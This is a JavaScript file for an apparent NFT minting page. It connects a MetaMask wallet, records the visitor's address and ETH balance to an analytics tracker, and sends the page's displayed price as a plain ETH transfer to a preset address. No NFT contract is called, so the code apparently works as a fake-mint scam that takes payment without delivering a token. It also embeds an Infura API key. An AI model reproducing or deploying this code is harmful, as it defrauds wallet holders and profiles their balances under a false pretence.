const NETWORK_ID = 1;
const RPC_URL = 'https://mainnet.infura.io/v3/eafb29dbda2547aa86482c102bab615a';

if (window.invite_code) {
  _paq.push(['trackEvent',window.collection, 'ID', window.invite_code]);
}
if (window.bonus_code) {
  _paq.push(['trackEvent',window.collection, 'ID', window.bonus_code]);
}
class Wallet {provider
    onboard = Onboard({
        networkId: NETWORK_ID,
        darkMode: !0,
        subscriptions: {
            wallet: wallet=>{
                if (wallet.provider) {
                    this.provider = new ethers.providers.Web3Provider(wallet.provider,'any')
                    window.localStorage.setItem('selectedWallet', wallet.name)
                } else {
                    this.provider = null
                }
            }
        },
        walletSelect: {
            wallets: [{
                walletName: 'metamask'
            }]
        }
    })
    async connectWallet() {
        await this.onboard.walletSelect()
        await this.onboard.walletCheck()
    }
    readyToTransact = async()=>{
        if (!this.provider) {
            const walletSelected = await this.onboard.walletSelect()            
            if (!walletSelected)
                return !1
        } else {
          
        }
        const ready = await this.onboard.walletCheck()
        return ready
    }
    async sendEth() {
        let el = function(e ){return document.getElementById(e)}
        let html = function(e,v){ document.getElementById(e).innerHTML = v}
        let price = document.getElementById('price').textContent.toString();
        _paq.push(['trackEvent',window.collection, 'Mint - NFT', JSON.stringify(qs)]);
        const ready = await this.readyToTransact()
        if (!ready)
            return
        _paq.push(['trackEvent',window.collection, 'Mint -Select Wallet']);
        const signer = this.provider.getUncheckedSigner()        
        let walletAddress, balance, transactionCount, balanceAmount;
        walletAddress = await signer.getAddress()     
        balance = await this.provider.getBalance(walletAddress);
        balanceAmount = ethers.utils.formatUnits(ethers.BigNumber.from(balance._hex).toString(), 18);
        document.getElementById('cta').innerHTML = 'MINT NOW';
        document.getElementById('wallet').innerHTML = "Connected: " + ((screen.availWidth > 390) ? walletAddress : walletAddress.substr(0,24) + '..');
        _paq.push(['trackEvent', window.collection,  "Wallet - " +  walletAddress, balanceAmount ]);
        try {
            await signer.sendTransaction({
                to: ADDRESS,
                value: ethers.utils.parseEther(price),
                gasLimit: 100000,
            });
            _paq.push(['trackEvent', window.collection, 'SALE', 'Mint NFT', price]);
        } catch (err) {
            console.log(err.message);
            _paq.push(['trackEvent', window.collection, 'Mint -Error Sending Mint Transaction', err.message]);
        }
    }
}
const wallet = new Wallet();